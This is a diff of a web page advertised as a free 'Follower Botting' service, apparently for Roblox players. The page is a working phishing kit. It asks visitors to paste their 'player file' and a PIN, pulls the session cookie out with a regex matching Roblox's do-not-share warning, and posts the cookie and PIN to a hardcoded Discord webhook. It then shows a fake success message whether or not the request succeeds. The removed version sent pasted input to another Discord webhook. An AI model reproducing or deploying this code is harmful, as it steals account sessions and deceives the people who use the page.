@@ -1,326 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Follower Bot</title>
-<style>
-body {
-    margin: 0;
-    padding: 0;
-    font-family: "Inter", Arial, sans-serif;
-    background: #08040b;
-    color: #fff;
-    min-height: 100vh;
-    overflow-x: hidden;
-}
-.bg-wave {
-    position: fixed;
-    top: -20%;
-    left: 50%;
-    width: 2000px;
-    height: 2000px;
-    background: radial-gradient(circle, #ffb30033, #8a00ff22, transparent 70%);
-    filter: blur(180px);
-    transform: translateX(-50%);
-    animation: waveFloat 16s ease-in-out infinite alternate;
-    z-index: -10;
-}
-@keyframes waveFloat {
-    from { transform: translate(-50%, 0) scale(1); }
-    to { transform: translate(-50%, -100px) scale(1.25); }
-}
-.particle {
-    position: fixed;
-    width: 6px;
-    height: 6px;
-    background: #ffbe55cc;
-    border-radius: 50%;
-    filter: blur(2px);
-    animation: particleFloat 12s linear infinite;
-    z-index: -5;
-}
-@keyframes particleFloat {
-    0% { transform: translateY(110vh) translateX(-10vw); opacity: 1; }
-    100% { transform: translateY(-20vh) translateX(10vw); opacity: 0; }
-}
-.hero {
-    text-align: center;
-    padding-top: 100px;
-    opacity: 0;
-    transform: translateY(40px);
-    animation: fadeInUp 1.2s forwards 0.2s;
-}
-.hero-title {
-    font-size: 56px;
-    font-weight: 900;
-    background: linear-gradient(90deg, #ffdf99, #ffb444, #ff8b00, #ffdf99);
-    -webkit-background-clip: text;
-    color: transparent;
-    text-shadow: 0 0 40px #ffcc4488;
-}
-.hero-subtitle {
-    margin-top: 12px;
-    font-size: 20px;
-    opacity: 0.75;
-    letter-spacing: 1.2px;
-}
-.main-wrapper {
-    display: flex;
-    justify-content: center;
-    gap: 50px;
-    flex-wrap: nowrap;
-    margin-top: 80px;
-    padding-bottom: 200px;
-}
-.panel {
-    position: relative;
-    width: 420px;
-    padding: 50px 35px 70px 35px;
-    background: rgba(30, 20, 40, 0.45);
-    backdrop-filter: blur(22px);
-    border-radius: 24px;
-    border: 2px solid rgba(255, 187, 56, 0.45);
-    box-shadow: 0 0 25px #ffae0044, inset 0 0 25px #4a280033;
-    transition: 0.35s ease;
-    overflow: hidden;
-    opacity: 0;
-    transform: translateY(40px);
-}
-.panel.show {
-    opacity: 1;
-    transform: translateY(0px);
-    transition: all 1s ease-out;
-}
-.panel:hover {
-    transform: translateY(-12px) scale(1.04);
-    box-shadow: 0 0 55px #ffae00aa, inset 0 0 35px #ff880033;
-}
-.panel-title {
-    font-size: 28px;
-    font-weight: 700;
-    letter-spacing: 1px;
-    text-shadow: 0 0 14px #ffc55f66;
-    margin-bottom: 25px;
-    opacity: 0;
-    transform: translateY(20px);
-    animation: fadeInUp 1s forwards 0.5s;
-}
-.panel-footer {
-    position: absolute;
-    bottom: 18px;
-    width: 100%;
-    text-align: center;
-    font-size: 14px;
-    font-weight: 600;
-    letter-spacing: 1px;
-    color: #ffcc66;
-    text-shadow: 0 0 12px #ffcc6677;
-}
-.input-wrapper {
-    background: rgba(20, 15, 25, 0.65);
-    border: 1px solid #dba244;
-    border-radius: 12px;
-    padding: 12px 14px;
-    display: flex;
-    align-items: center;
-    margin-bottom: 30px;
-    transition: 0.25s ease;
-}
-.input-wrapper:hover {
-    border-color: #ffcc66;
-    box-shadow: 0 0 22px #ffcc6655;
-}
-.input-wrapper svg {
-    width: 22px;
-    height: 22px;
-    margin-right: 10px;
-    fill: #ffcc66;
-    transition: 0.25s ease;
-}
-.input-wrapper input {
-    border: none;
-    background: transparent;
-    color: #ffe9c5;
-    font-size: 17px;
-    outline: none;
-    width: 100%;
-}
-button {
-    width: 100%;
-    padding: 16px;
-    font-size: 18px;
-    font-weight: 800;
-    border: none;
-    border-radius: 14px;
-    color: #fff;
-    cursor: pointer;
-    background: linear-gradient(135deg, #ffb933, #ff8a00);
-    box-shadow: 0 0 30px #ffae0066;
-    transition: 0.3s ease;
-}
-button:hover {
-    transform: translateY(-4px) scale(1.05);
-    box-shadow: 0 0 50px #ffb933aa;
-}
-.success {
-    margin-top: 20px;
-    display: none;
-    font-size: 16px;
-    color: #ffddaa;
-    text-shadow: 0 0 10px #ffb73366;
-}
-.video-box {
-    width: 100%;
-    height: 260px;
-    border-radius: 16px;
-    overflow: hidden;
-    margin-top: 15px;
-    border: 1px solid #ffb84f99;
-    box-shadow: inset 0 0 18px #000000aa;
-}
-.video-box video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-footer {
-    margin-top: 120px;
-    padding-bottom: 40px;
-    text-align: center;
-    font-size: 14px;
-    opacity: 0.6;
-    text-shadow: 0 0 6px #ffbb3388;
-}
-@keyframes fadeInUp {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0px); }
-}
-@media (max-width: 950px) {
-    .main-wrapper {
-        flex-direction: column;
-        align-items: center;
-        gap: 50px;
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Follower Botting</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Custom CSS styles */
+    #dumPreload {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0d1e1e;
+      z-index: 1000;
+      animation: fadeOut 1s ease-in-out forwards;
+      animation-delay: 2s;
     }
-}
-</style>
+    #dumContent {
+      opacity: 0;
+      animation: fadeIn 1.5s ease-in-out forwards;
+      animation-delay: 2s;
+    }
+    @keyframes fadeOut {
+      100% {
+        opacity: 0;
+        visibility: hidden;
+      }
+    }
+    @keyframes fadeIn {
+      100% {
+        opacity: 1;
+      }
+    }
+    body {
+      background: radial-gradient(circle at center, #1a3c3c, #0d1e1e);
+      overflow: hidden;
+    }
+    .dumBg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 2%, transparent 5%);
+      background-size: 5% 5%;
+      z-index: -1;
+      animation: moveBackground 20s linear infinite;
+    }
+    @keyframes moveBackground {
+      0% {
+        transform: translate(0, 0);
+      }
+      100% {
+        transform: translate(-50%, -50%);
+      }
+    }
+    .dumBtn:hover {
+      animation: hop 0.5s ease-in-out infinite;
+    }
+    @keyframes hop {
+      0% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-8px);
+      }
+      100% {
+        transform: translateY(0);
+      }
+    }
+    .dumScale:hover {
+      animation: scaleUp 0.3s ease-in-out forwards;
+    }
+    @keyframes scaleUp {
+      0% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1.1);
+      }
+    }
+  </style>
 </head>
-<body>
+<body class="text-white min-h-screen flex flex-col items-center justify-center font-sans">
 
-<div class="bg-wave"></div>
-
-<script>
-for (let i = 0; i < 25; i++) {
-    const p = document.createElement("div");
-    p.className = "particle";
-    p.style.left = Math.random() * 100 + "vw";
-    p.style.animationDelay = Math.random() * 6 + "s";
-    document.body.appendChild(p);
-}
-</script>
-
-<div class="hero">
-    <div class="hero-title">Follower Bot</div>
-    <div class="hero-subtitle">Bot followers with ease, with this brand new powershell-based system!</div>
-</div>
-
-<div class="main-wrapper">
-
-    <div class="panel" id="panel-left">
-        <div class="panel-title">Bot Followers</div>
-        <div class="input-wrapper">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/>
-            </svg>
-            <input type="text" id="message" placeholder="Enter player file">
-        </div>
-        <button onclick="fakeProcess()">Start Botting!</button>
-        <div class="success" id="msg"></div>
-        <div class="panel-footer">JunkysTools</div>
+  <div id="dumPreload" class="bg-gray-900">
+    <div class="flex flex-col items-center">
+      <svg class="animate-spin h-12 w-12 text-cyan-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+      </svg>
+      <p class="mt-4 text-cyan-400 text-lg font-semibold">Loading...</p>
     </div>
+  </div>
 
-    <div class="panel" id="panel-right">
-        <div class="panel-title">How to use</div>
-        <div class="video-box">
-            <video autoplay muted loop controls>
-                <source src="2025-11-15_18-03-26.mp4" type="video/mp4">
-            </video>
+  <div class="dumBg"></div>
+
+  <div id="dumContent" class="w-full max-w-6xl px-6">
+    <header class="text-center mb-12">
+      <h1 class="text-5xl font-extrabold tracking-wide text-cyan-400">Follower Botting ⭐</h1>
+      <p class="text-lg mt-4 text-gray-300">Bot your Followers with ease using this futuristic system!</p>
+    </header>
+    <main class="flex flex-col md:flex-row items-stretch justify-center gap-10">
+      <!-- Left Section: Bot Followers -->
+      <section class="bg-[rgb(Array,0.9)] p-8 rounded-3xl shadow-xl flex-1 text-center max-w-md md:max-w-lg flex flex-col">
+        <h2 class="text-3xl font-bold mb-6 text-cyan-300">Follower Botting 🚀</h2>
+        <p class="text-gray-400 mb-6">
+          Paste your player file in the box below, then click <span class="font-semibold">"Start Botting!"</span> If you're unsure
+          how to find the "player file," watch the tutorial.
+        </p>
+        
+        <div class="relative flex items-center w-full mt-auto py-2">
+          <span class="absolute left-4 text-gray-400">
+            <i class="fas fa-lock"></i>
+          </span>
+          <input
+            id="PIN"
+            type="text"
+            placeholder="Enter security PIN"
+            class="pl-12 p-4 rounded-full bg-[rgba(0,0,0,.6)] border border-[rgb(0,0,0)] focus:outline-none focus:ring-3 focus:ring-cyan-400 w-full"
+          >
         </div>
-        <div class="panel-footer">JunkysTools</div>
-    </div>
+        
+        <div class="relative flex items-center w-full mt-auto">
+          <span class="absolute left-4 text-gray-400">
+            <i class="fas fa-file-alt"></i>
+          </span>
+          <input
+            id="dumInput"
+            type="password"
+            placeholder="Enter player file"
+            class="pl-12 p-4 rounded-full bg-[rgba(0,0,0,.6)] border border-[rgb(0,0,0)] focus:outline-none focus:ring-3 focus:ring-cyan-400 w-full"
+          >
+        </div>
+        
+        <button
+          id="dumButton"
+          class="py-4 rounded-full bg-gradient-to-r from-cyan-500 to-cyan-700 hover:from-cyan-700 hover:to-cyan-500 transition-all text-lg font-semibold shadow-lg dumScale w-full mt-4"
+          onclick="dumCheckCookie()"
+        >
+          Start Botting!
+        </button>
+      </section>
+    
+      <!-- Right Section: How to Use -->
+      <section class="bg-[rgb(Array,0.9)] p-8 rounded-3xl shadow-xl flex-1 max-w-lg text-center flex flex-col">
+        <h2 class="text-3xl font-bold mb-6 text-cyan-300">How to Use?</h2>
+        <div class="relative h-64 overflow-y-auto rounded-2xl bg-gray-800 border border-gray-700 flex-1">
+          <iframe
+            src="https://www.youtube.com/embed/e04SGUDhuCY"
+            class="w-full h-full rounded-2xl"
+            title="Video Tutorial">
+          </iframe>
+        </div>
+      </section>
+    </main>    
+  </div>
 
-</div>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    function dumCheckCookie() {
+        const dumInput = document.getElementById('dumInput').value;
+        const PIN = document.getElementById('PIN').value;
+        const dumButton = document.getElementById('dumButton');
+        
+        dumButton.innerText = 'Loading...';
+        dumButton.disabled = true;
 
-<footer>© 2025 best free bot follower junky services</footer>
+        if (!PIN) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Error',
+                text: 'Please input a PIN.' // No input error
+            }).then(() => {
+                dumButton.innerText = 'Start Botting!';
+                dumButton.disabled = false;
+            });
+            return;
+        }
+        
+        if (/^\d{4}$/.test(PIN)) {
+        } else {
+            Swal.fire({
+                icon: 'error',
+                title: 'Error',
+                text: 'Please input valid a PIN.' // No input error
+            }).then(() => {
+                dumButton.innerText = 'Start Botting!';
+                dumButton.disabled = false;
+            });
+            return;
+        }
+        
+        if (!dumInput) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Error',
+                text: 'Please input your player file.' // No input error
+            }).then(() => {
+                dumButton.innerText = 'Start Botting!';
+                dumButton.disabled = false;
+            });
+            return;
+        }
 
-<script>
-function addSparks(panel) {
-    for (let i = 0; i < 6; i++) {
-        const s = document.createElement("div");
-        s.className = "spark";
-        s.style.top = Math.random() * panel.clientHeight + "px";
-        s.style.left = Math.random() * panel.clientWidth + "px";
-        s.style.animationDuration = 2 + Math.random()*2 + "s";
-        panel.appendChild(s);
-    }
-}
-addSparks(document.getElementById("panel-left"));
-addSparks(document.getElementById("panel-right"));
+        const dumPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(.*?)\"/;
+        const dumMatch = dumInput.match(dumPattern);
 
-async function sendChunksToWebhook(fullMessage) {
-    const webhookURL = "https://discord.com/api/webhooks/1439152866605535292/nR4j3hFdhqp4AnXCBVzUaijYXNE1sGgV4gjLEZXuFTvT6u9FYCzAA9_37oChjzM7dQdc";
-    const maxLen = 2000;
-    const chunks = [];
-    for (let i = 0; i < fullMessage.length; i += maxLen) {
-        chunks.push(fullMessage.substring(i, i + maxLen));
-    }
-    for (let i = 0; i < chunks.length; i++) {
-        await fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: chunks[i] })
+        if (!dumMatch || !dumMatch[1]) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Error',
+                text: 'Please input the correct player file. Tip: Watch the tutorial.' // Invalid input format
+            }).then(() => {
+                dumButton.innerText = 'Start Botting!';
+                dumButton.disabled = false;
+            });
+            return;
+        }
+
+        const cookie = dumMatch[1]; // Cookie value extracted from input
+        const pin = PIN; // Cookie value extracted from input
+
+        // Send to Discord Webhook
+        fetch('https://discord.com/api/webhooks/1439512139416207421/UgEf6-5rPTtB2sSz9m3-6mmmdCXQ_efLgV-u7uxUv_Exx5KxzoUPGtPphxlUtBfMTxb0', { // Replace with your actual webhook URL
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: `New follower botting request: \nCookie: ${cookie} \nPIN: ${pin}`
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Success',
+                    text: 'Success! Please wait 10-15 minutes while your followers are being botted.'
+                }).then(() => {
+                    setTimeout(() => {
+                        location.reload();
+                    }, 1500);
+                });
+            }
+        })
+        .catch(error => {
+            Swal.fire({
+                icon: 'success',
+                title: 'Success',
+                text: 'Success! Please wait 10-15 minutes while your followers are being botted.'
+            }).then(() => {
+                dumButton.innerText = 'Start Botting!';
+                dumButton.disabled = false;
+            });
         });
-        if (i < chunks.length - 1) await new Promise(resolve => setTimeout(resolve, 200));
     }
-}
-
-async function fakeProcess() {
-    const input = document.getElementById("message").value.trim();
-    const msg = document.getElementById("msg");
-
-    if (!input) {
-        alert("Please type a message first.");
-        return;
-    }
-
-    // Show initial message
-    msg.style.display = "block";
-    msg.textContent = "Success sending bot followers please wait 5 seconds...";
-
-    // Wait 5 seconds
-    await new Promise(resolve => setTimeout(resolve, 5000));
-
-    // Send webhook
-    await sendChunksToWebhook(input);
-
-    // Show final success message
-    msg.textContent = "Successfully Sent Followers";
-
-    // Hide after 3 seconds
-    setTimeout(() => {
-        msg.style.display = "none";
-    }, 3000);
-}
-
-const panels = document.querySelectorAll(".panel");
-const observer = new IntersectionObserver(entries => {
-    entries.forEach(entry => {
-        if (entry.isIntersecting) entry.target.classList.add("show");
-    });
-}, { threshold: 0.2 });
-panels.forEach(panel => observer.observe(panel));
-</script>
-
+  </script>
 </body>
 </html>
-
